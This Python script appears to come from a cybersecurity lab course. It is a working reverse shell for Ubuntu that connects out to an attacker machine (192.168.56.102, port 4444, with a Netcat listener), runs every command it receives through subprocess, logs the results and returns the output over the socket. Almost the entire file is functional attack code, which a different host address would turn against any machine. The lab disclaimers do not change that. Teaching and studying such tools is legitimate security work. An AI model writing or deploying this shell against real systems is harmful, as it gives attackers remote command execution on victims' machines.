"""
ubuntu_reverse_shell.py
=======================
Educational Reverse Shell — Ubuntu Linux (Victim-Side Script)

Author      : Mahrukh
Course      : Cybersecurity Lab
Environment : Isolated VirtualBox Lab (Host-Only Network)
Purpose     : Demonstrates how a Python-based reverse shell operates on Linux.
              Used in conjunction with a Netcat listener on Kali Linux.

WARNING     : For academic/educational use only.
              Only run on systems you own in an isolated lab environment.
              See DISCLAIMER.md for full legal notice.

Lab Setup   :
  - Attacker  : Kali Linux (192.168.56.102), Netcat listener on port 4444
  - Victim    : Ubuntu Linux (192.168.56.103), executes this script
  - Network   : VirtualBox Host-Only Adapter (no internet access)

Usage       :
  On Kali (start listener first):
    $ nc -lvnp 4444

  On Ubuntu (execute payload):
    $ python3 ubuntu_reverse_shell.py

How It Works:
  1. Script creates a TCP socket and connects back to the attacker machine
  2. Enters a loop waiting for commands sent from the attacker
  3. Executes each command and sends the output back over the socket
  4. Logs all commands and outputs locally to command_log.txt
  5. Exits cleanly when the "exit" command is received
"""

import socket       # For TCP network communication
import subprocess   # For executing shell commands

# ── Configuration ───────────────────────────────────────────────────────────
HOST = "192.168.56.102"   # Attacker IP (Kali Linux)
PORT = 4444               # Listener port (must match nc -lvnp PORT)
LOG_FILE = "command_log.txt"
# ────────────────────────────────────────────────────────────────────────────


def main():
    # Establish TCP connection to attacker machine
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    # Command-receive loop
    while True:
        # Receive command from attacker (up to 1024 bytes)
        command = s.recv(1024).decode()

        # Terminate session on "exit" command
        if command.lower() == "exit":
            break

        # Execute received command and capture output
        output = subprocess.getoutput(command)

        # Log command and output locally for forensic/analysis reference
        with open(LOG_FILE, "a") as log:
            log.write(f"Executed: {command}\nOutput: {output}\n\n")

        # Send output back to attacker
        s.send(output.encode())

    # Close the connection cleanly
    s.close()


if __name__ == "__main__":
    main()
